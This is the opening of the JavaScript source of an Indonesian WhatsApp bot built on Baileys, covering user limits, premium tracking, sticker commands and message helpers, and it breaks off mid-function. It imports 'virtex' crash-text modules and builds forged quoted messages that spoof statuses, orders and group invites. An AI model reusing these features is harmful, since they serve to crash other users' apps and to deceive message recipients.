  /*Assalamualaikum Semua👋
Bagi yang udah ambil sc ini, sebelum nya terima kasih sudah download:))
Jangann lupa ya kasih tq to nama gua "Arasyaa", yang mau recode izin ke gua dulu aja https://wa.me/6283102774416

Thanks To
- Affis
- Rafli Rusdiana
- Manik
- Megumin Desu
- Penyedia Rest api
- Riyann
- Arasyaaa
- YogiPw
- DappaUhuy
- Mhank Bar Bar

arigatouuuuuuuu, selamat ngerun, klo eror jangan salahin gua jancuk*/
 const {
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  MessageOptions,
  Mimetype,
  MimetypeMap,
  WALocationMessage,
  ChatModification,
  WA_MESSAGE_STUB_TYPES,
  WA_DEFAULT_EPHEMERAL,
  ResyaaectMode,
  ProxyAgent,
  GroupSettingChange,
  waChatKey,
  mentionedJid,
  processTime,
} = require("@adiwajshing/baileys");
const simple = require('./lib/simple.js');
const { virtexp, vipi } = require("./lib/virtex.js"); //memans
const hx = require("hxz-api");
const yo = require("tod-api");
const qrcode = require("qrcode-terminal");
const moment = require("moment-timezone");
const speed = require("performance-now");
const request = require("request");
const { spawn, exec, execSync } = require("child_process");
const fs = require("fs");
const axios = require("axios");
const ffmpeg = require("fluent-ffmpeg");
const { EmojiAPI } = require("emoji-api");
const ig = require("insta-fetcher");
const emoji = new EmojiAPI();
const fetch = require("node-fetch");
const FormData = require("form-data");
const phoneNum = require("awesome-phonenumber");
const gis = require("g-i-s");
const ggs = require("google-it");
const got = require("got");
const imageToBase64 = require("image-to-base64");
const ID3Writer = require("browser-id3-writer");
const brainly = require("brainly-scraper");
const yts = require("yt-search");
const ms = require("parse-ms");
const toMs = require("ms");
const imgbb = require("imgbb-uploader");
const { error } = require("qrcode-terminal");
const {
  getBuffer,
  h2k,
  generateMessageID,
  getGroupAdmins,
  getRandom,
  banner,
  start,
  info,
  success,
  close,
} = require("./lib/functions");
const { color, bgcolor } = require("./lib/color");
const { fetchJson, getBase64, kyun, createExif } = require("./lib/fetcher");
const { yta, ytv, igdl, upload, formatDate } = require("./lib/ytdl");
const { lirikLagu } = require('./lib/lirik.js')
const { recognize } = require('./lib/ocr')
const { virtex } = require('./virtex/virtex')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { virtex5 } = require('./virtex/virtex5')
const { virtex6 } = require('./virtex/virtex6')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { webp2mp4File } = require("./lib/webp2mp4");
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const afk = JSON.parse(fs.readFileSync("./lib/off.json"));
const { sleep, isAfk, cekafk, addafk } = require("./lib/offline");
const { cmdadd } = require("./lib/totalcmd.js");
const tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))
const sambungkata = JSON.parse(fs.readFileSync('./database/sambungkata.json'))
const akinator = JSON.parse(fs.readFileSync('./database/akinator.json'))
const voting = JSON.parse(fs.readFileSync("./lib/voting.json"));
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const { addVote, delVote } = require("./lib/vote");
const _limit = JSON.parse(fs.readFileSync('./database/limit.json'))
const uang = JSON.parse(fs.readFileSync('./database/uang.json'))
const reminder = require("./lib/reminder")
const { jadibot, stopjadibot, listjadibot } = require("./lib/jadibot");
const _reminder = JSON.parse(fs.readFileSync("./database/reminder.json"));
/*SETTINGGGGGGGG*/
banChats = false;
offline = false;
targetpc = "6283102774416";
gopay = "0831-0277-4416";
limitawal = "900"
ovo = "0831-0277-4416";
pulsa = "0831-0277-4416";
dana = "0831-0277-4416"
namabot = "*KY-Bot*";
linkimg = "https://telegra.ph/file/88c94984d46ab3784a759.png";
/*ITU YG DI ATAS LINK IMAGENYA DONASI DANA YA KAWAN*/
grupct = "https://akucintakamu.com";
owner = "6283102774416";
nama_owner = "IKYYY";
instagram = "Lupa.id";
email = "iky@gmail.com";
fake = "*KY - BOT*";
thumb = fs.readFileSync("./stik/thumb.jpeg");
numbernye = "0";
waktu = "-";
alasan = "Gada🗿";
autojoin = false;
prefixStatus = false;
hit_today = [];
zeksapi = 'Ardy-ApiKey'
apikey = 'IKYGANS21'

/*Akhir Setting*/

//=================================================//
let _scommand = JSON.parse(fs.readFileSync("./database/scommand.json"));
//Biasalah Storage
const videonye = JSON.parse(fs.readFileSync('./strg/video.json'))
const fiturnye = JSON.parse(fs.readFileSync('./database/video.json'))
const imagenye = JSON.parse(fs.readFileSync('./strg/image.json'))
const audionye = JSON.parse(fs.readFileSync('./strg/audio.json'))
const setiker = JSON.parse(fs.readFileSync('./strg/stik.json'))

     /********** PREMIUM **********/
     const getPremiumExpired = (sender) => {

		    let position = null
		    Object.keys(prem).forEach((i) => {
		        if (prem[i].id === sender) {
		            position = i
		        }
		    })
		    if (position !== null) {
		        return prem[position].expired
		    }
		} 
		
		const expiredCheck = () => {
		    setInterval(() => {
		        let position = null
		        Object.keys(prem).forEach((i) => {
		            if (Date.now() >= prem[i].expired) {
		                position = i
		            }
		        })
		        if (position !== null) {
		            console.log(`Premium expired: ${prem[position].id}`)
		            prem.splice(position, 1)
		            fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
		             }
		    }, 1000)
		} 
		
		const getAllPremiumUser = () => {
		    const array = []
		    Object.keys(prem).forEach((i) => {
		        array.push(prem[i].id)
		    })
		    return array
		}
		
		//
		
		//ATM
const addATM = (sender) => {
        	const obj = {id: sender, uang : 0}
            uang.push(obj)
            fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
        }
        
        const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang += amount
                fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
            }
        }
        
        const checkATMuser = (sender) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return uang[position].uang
            }
        }
        
        const bayarLimit = (sender, amount) => {
        	let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
            }
        }
        	
        const confirmATM = (sender, amount) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang -= amount
                fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
            }
        }
        
         const limitAdd = (sender) => {
             let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit += 1
                fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
            }
        }
		//function check limit
          const checkLimit = (sender) => {
          	let found = false
                    for (let lmt of _limit) {
                        if (lmt.id === sender) {
                            let limitCounts = limitawal - lmt.limit
                            if (limitCounts <= 0) return syaa.sendMessage(from,`Limit request anda sudah habis\n\n_Note : limit bisa di dapatkan dengan cara ${prefix}buylimit dan dengan naik level_`, text,{ quoted: mek})
                            syaa.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, limit: 0 }
                        _limit.push(obj)
                        fs.writeFileSync('./database/pengguna/limit.json', JSON.stringify(_limit))
                        syaa.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                    }
				}
// Sticker Cmd
const addCmd = (id, command) => {
  const obj = { id: id, chats: command };
  _scommand.push(obj);
  fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
};

const getCommandPosition = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return position;
  }
};

const getCmd = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return _scommand[position].chats;
  }
};

const checkSCommand = (id) => {
  let status = false;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      status = true;
    }
  });
  return status;
};
const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
module.exports = syaa = async (syaa, mek) => {
  try {
    if (!mek.hasNewMessage) return;
    mek = mek.messages.all()[0];
    if (!mek.message) return;
    if (mek.key && mek.key.remoteJid == "status@broadcast") return;
    global.blocked;
    mek.message =
      Object.keys(mek.message)[0] === "ephemeralMessage"
        ? mek.message.ephemeralMessage.message
        : mek.message;
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const {
      text,
      extendedText,
      contact,
      location,
      liveLocation,
      image,
      video,
      sticker,
      document,
      audio,
      product,
    } = MessageType;
    const type = Object.keys(mek.message)[0];
    1;
    var prefixRegEx = /^[!&z?=#.+\/]/gi;
    let _chats =
      type === "conversation" && mek.message.conversation
        ? mek.message.conversation
        : type == "imageMessage" && mek.message.imageMessage.caption
        ? mek.message.imageMessage.caption
        : type == "videoMessage" && mek.message.videoMessage.caption
        ? mek.message.videoMessage.caption
        : type == "extendedTextMessage" && mek.message.extendedTextMessage.text
        ? mek.message.extendedTextMessage.text
        : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId
        ? mek.message[type].selectedButtonId
        : type == "stickerMessage" &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== null &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined
        ? getCmd(mek.message[type].fileSha256.toString("base64"))
        : "";
    let prefix = _chats.match(prefixRegEx) ? prefixRegEx.exec(_chats)[0] : "";
    body =
      type === "conversation" && mek.message.conversation.startsWith(prefix)
        ? mek.message.conversation
        : type == "imageMessage" &&
          mek.message.imageMessage.caption.startsWith(prefix)
        ? mek.message.imageMessage.caption
        : type == "videoMessage" &&
          mek.message.videoMessage.caption.startsWith(prefix)
        ? mek.message.videoMessage.caption
        : type == "extendedTextMessage" &&
          mek.message.extendedTextMessage.text.startsWith(prefix)
        ? mek.message.extendedTextMessage.text
        : "";
    budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
    let chats = _chats.match(prefixRegEx)
      ? _chats
          .split(prefixRegEx)
          .find((v) => v === _chats.replace(prefixRegEx, ""))
      : _chats;
    let command = chats.split(/ +/g)[0];
    hit_today.push(command);
    const args = _chats.trim().split(/ +/).slice(1);
    const arg = body.substring(body.indexOf(' ') + 1)
    const isCmd = _chats.match(prefixRegEx)
      ? prefixRegEx.exec(_chats)["input"]
      : _chats;
    const q = args.join(" ");
    const botNumber = syaa.user.jid;
    const botNumberss = syaa.user.jid + "@c.us";
    const isGroup = from.endsWith("@g.us");
    //test command
        //akhir
    const antilink = JSON.parse(fs.readFileSync("./database/antilink.json"));
    const antivirtex = JSON.parse(
      fs.readFileSync("./database/antivirtex.json")
    );
    const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
    const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
    const antihidetg = JSON.parse(
      fs.readFileSync("./database/antihidetag.json")
    );
    const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
    const isAntiviewonce = isGroup ? antivo.includes(from) : false;
    const isKickarea = isGroup ? kickarea.includes(from) : false;
    const isAntivirtex = isGroup ? antivirtex.includes(from) : false;
    const isAntilink = isGroup ? antilink.includes(from) : false;

    const sender = mek.key.fromMe
      ? syaa.user.jid
      : isGroup
      ? mek.participant
      : mek.key.remoteJid;
    let senderr = mek.key.fromMe
      ? syaa.user.jid
      : mek.key.remoteJid.endsWith("@g.us")
      ? mek.participant
      : mek.key.remoteJid;
    // const isSelfNumber = config.NomorSELF
    // const isOwner = sender.id === isSelfNumber
    const totalchat = await syaa.chats.all();
    const m = simple.smsg(syaa, mek);
    const groupMetadata = isGroup ? await syaa.groupMetadata(from) : "";
    const groupName = isGroup ? groupMetadata.subject : "";
    const groupId = isGroup ? groupMetadata.jid : "";
    const groupMembers = isGroup ? groupMetadata.participants : "";
    const groupDesc = isGroup ? groupMetadata.desc : "";
    const groupOwner = isGroup ? groupMetadata.owner : "";
    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : "";
    const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
    const isGroupAdmins = groupAdmins.includes(sender) || false;
    const isOwner = ownerNumber.includes(sender)
    const isBanned = ban.includes(sender)
    const isPremium= prem.includes(sender)
    const isVote = isGroup ? voting.includes(from) : false;
    const conts = mek.key.fromMe
      ? syaa.user.jid
      : syaa.contacts[sender] || { notify: jid.replace(/@.+/, "") };
    const pushname = mek.key.fromMe
      ? syaa.user.name
      : conts.notify || conts.vname || conts.name || "-";
    const readmore = "͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏";
    if (prefix && command) cmdadd();
    const totalhit = JSON.parse(fs.readFileSync("./lib/totalcmd.json"))[0]
      .totalcmd;
    //Y
    const time = moment.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
    const jam = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const wita = moment.tz("Asia/Makassar").format("HH:mm:ss");
    const wit = moment.tz("Asia/Jayapura").format("HH:mm:ss");
    let d = new Date();
    let locale = "id";
    let gmt = new Date(0).getTime() - new Date("1 January 1970").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
    ];
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let date = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
    let waktu = d.toLocaleDateString(locale, {
      hour: "numeric",
      minute: "numeric",
      second: "numeric",
    });
    const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Selamat malam";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Selamat senja";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Selamat sore";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Selamat siang";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Selamat pagi";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Selamat malam";
    }
    

    //MESS
    mess = {
      wait: "Sedang Proses nihh, tunggu ya",
      admin: "*[ ADMIN GROUP ONLY ]*",
      prem: "Khusus Member Premm!!!",
      own: "*[OWNER BOT ONLY]*",
      ban: "Kamu Telah Di Ban Oleh Owner, silahkan chat owner untuk minta di unban",
      success: "Success√",
      wrongFormat: "Format salah, Liat kembali di menu",
      error: {
        stick: "Sticker Only",
        Iv: "Link Gak Valid",
      },
      only: {
        group: "*[ GROUP ONLY ]*",
      },
    };

    const isUrl = (url) => {
      return url.match(
        new RegExp(
          /https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/,
          "gi"
        )
      );
    };

    const reply = (teks) => {
      syaa.sendMessage(from, teks, text, { quoted: mek });
    };

    const sendMess = (hehe, teks) => {
      syaa.sendMessage(hehe, teks, text);
    };
    

    const mentions = (teks, memberr, id) => {
      id == null || id == undefined || id == false
        ? syaa.sendMessage(from, teks.trim(), extendedText, {
            contextInfo: { mentionedJid: memberr },
          })
        : syaa.sendMessage(from, teks.trim(), extendedText, {
            quoted: mek,
            contextInfo: { mentionedJid: memberr },
          });
    };

    const ftroli = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "6289523258649-1604595598@g.us",
      },
      message: {
        orderMessage: {
          itemCount: 10,
          status: 200,
          thumbnail: thumb,
          surface: 200,
          message: fake,
          orderTitle: "Arasyaaaaa.",
          sellerJid: "0@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
    const fdoc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { documentMessage: { title: fake, jpegThumbnail: thumb } },
    };
    const fvn = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 99999,
          ptt: "true",
        },
      },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          gifPlayback: "true",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: "P",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
    const fvideo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
    const floc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { locationMessage: { name: fake, jpegThumbnail: thumb } },
    };
    const fakestatus = (teks) => {
      syaa.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "status@broadcast" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const fakethumb = (teks, yes) => {
      syaa.sendMessage(from, teks, image, {
        thumbnail: fs.readFileSync("./stik/fake.jpeg"),
        quoted: mek,
        caption: yes,
      });
    };
    const fakegroup = (teks) => {
      syaa.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const sendStickerFromUrl = async (to, url) => {
      var names = Date.now() / 10000;
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
      download(url, "./stik" + names + ".png", async function () {
        console.log("selesai");
        let filess = "./stik" + names + ".png";
        let asw = "./stik" + names + ".webp";
        exec(
          `ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`,
          (err) => {
            let media = fs.readFileSync(asw);
            syaa.sendMessage(to, media, MessageType.sticker, { quoted: mek });
            fs.unlinkSync(filess);
            fs.unlinkSync(asw);
          }
        );
      });
    };
    const ftokoo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {}),
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: fs.readFileSync(`./stik/thumb.jpeg`), //Gambarnye
            },
            title: "Yogi-Fakereply", //Kasih namalu
            description: "SELF BOT",
            currencyCode: "USD",
            priceAmount1000: "2000",
            retailerId: "Arasyaaaaa",
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
    const sendMediaURL = async (to, url, text = "", mids = []) => {
      if (mids.length > 0) {
        text = normalizeMention(to, text, mids);
      }
      const fn = Date.now() / 10000;
      const filename = fn.toString();
      let mime = "";
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          mime = res.headers["content-type"];
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
      download(url, filename, async function () {
        console.log("done");
        let media = fs.readFileSync(filename);
        let type = mime.split("/")[0] + "Message";
        if (mime === "image/gif") {
          type = MessageType.video;
          mime = Mimetype.gif;
        }
        if (mime.split("/")[0] === "audio") {
          mime = Mimetype.mp4Audio;
        }
        syaa.sendMessage(to, media, type, {
          quoted: mek,
          mimetype: mime,
          caption: text,
          contextInfo: { mentionedJid: mids },
        });

        fs.unlinkSync(filename);
      });
    };
    const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
      const buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
      };
      syaa.sendMessage(
        id,
        buttonMessage,
        MessageType.buttonsMessage,
        options
      );
    };
    const sendButImage = async (
      id,
      text1,
      desc1,
      gam1,
      but = [],
      options = {}
    ) => {
      kma = gam1;
      mhan = await syaa.prepareMessage(from, kma, image);
      const buttonMessages = {
        imageMessage: mhan.message.imageMessage,
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 4,
      };
      syaa.sendMessage(
        id,
        buttonMessages,
        MessageType.buttonsMessage,
        options
      );
    };
    const sendButVideo = async (
      id,
      text1,
      desc1,
      vid1,
      but = [],
      options = {}
    ) => {
      kma = vid1;
      mhan = await syaa.prepareMessage(from, kma, video);
      const buttonMessages = {
        videoMessage: mhan.message.videoMessage,
        contentText: text1,
